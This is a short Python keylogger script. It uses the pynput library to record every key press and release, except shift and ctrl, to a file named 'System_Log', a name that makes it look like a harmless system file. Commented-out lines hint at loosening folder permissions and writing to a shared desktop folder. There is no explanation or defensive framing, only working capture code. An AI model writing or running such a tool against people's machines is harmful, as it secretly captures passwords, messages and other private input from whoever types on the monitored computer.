import os
from pynput.keyboard import Key, Listener
# os.chmod(os.getcwd(),777)
file = open('System_Log','a')
# os.chdir('C:/Users/All Users/Desktop')
ignore = [Key.shift,Key.ctrl]

def on_press(key):
	if key not in ignore:
		file = open('System_Log','a')
		file.write(f'{key} Pressed\n')

def on_release(key):
	file.write(f'{key} Released\\n')
	# if key == Key.esc:
	# 	file.close()


# Collect events until released
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()